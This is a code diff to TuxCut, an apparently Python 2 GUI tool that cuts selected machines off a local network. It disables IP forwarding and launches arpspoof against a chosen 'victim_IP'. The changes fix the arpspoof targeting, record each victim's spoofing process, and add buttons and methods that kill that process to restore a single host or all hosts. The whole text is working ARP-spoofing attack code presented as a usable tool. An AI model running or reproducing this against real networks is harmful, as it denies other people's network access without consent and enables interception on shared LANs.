@@ -13,6 +13,7 @@ class TuxCut(QtGui.QMainWindow):
 		self._iface =None
 		self._isProtected = False
 		self._isFedora = True
+		self._cutted_hosts = {}
 		
 		self._gwIP = self.default_gw()
 		self._gwMAC = self.gw_mac(self._gwIP)
@@ -93,14 +94,28 @@ class TuxCut(QtGui.QMainWindow):
 	def cut_process(self,victim_IP):
 		## Disable ip forward
 		proc = sp.Popen(['sysctl','-w','net.ipv4.ip_forward=0'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
-		
+		print self._iface
 		### Start Arpspoofing the victim
 		#os.system("arpspoof -i " + self.icard + " -t " + self.gwip + " " + vicip + " & > /dev/null")
-		proc = sp.Popen(['arpspoof','-i',self._iface,'-t',victim_IP,self._gwIP,'&','>','/dev/null'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
-		print proc.pid
+		proc = sp.Popen(['arpspoof','-i',self._iface,'-t',self._gwIP,victim_IP],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
+		#self._cutted_hosts.setdefault(victim_IP,proc.pid)
+		self._cutted_hosts[victim_IP]=proc.pid
+		print self._cutted_hosts
 	
 	def resume_all(self):
 		sp.Popen(['sysctl','-w','net.ipv4.ip_forward=1'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
+		sp.Popen(['killall','arpspoof'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
+		
+		
+	def resume_single_host(self,victim_IP):
+		if self._cutted_hosts.has_key(victim_IP):
+			pid = self._cutted_hosts[victim_IP]
+			print "resuming >>>> ",pid
+			os.kill(pid,9)
+			del self._cutted_hosts[victim_IP]
+			print self._cutted_hosts
+		else:
+			print victim_IP,'is not attacked'
 		
 		
 	def on_protection_changes(self):
@@ -117,3 +132,10 @@ class TuxCut(QtGui.QMainWindow):
 		victim_IP =str(self.table_hosts.item(selectedRow,0).text())
 		if not victim_IP==None:
 			self.cut_process(victim_IP)
+
+	def on_resume_clicked(self):
+		selectedRow =  self.table_hosts.selectionModel().currentIndex().row()
+		victim_IP =str(self.table_hosts.item(selectedRow,0).text())
+		if not victim_IP==None:
+			self.resume_single_host(victim_IP)
+		
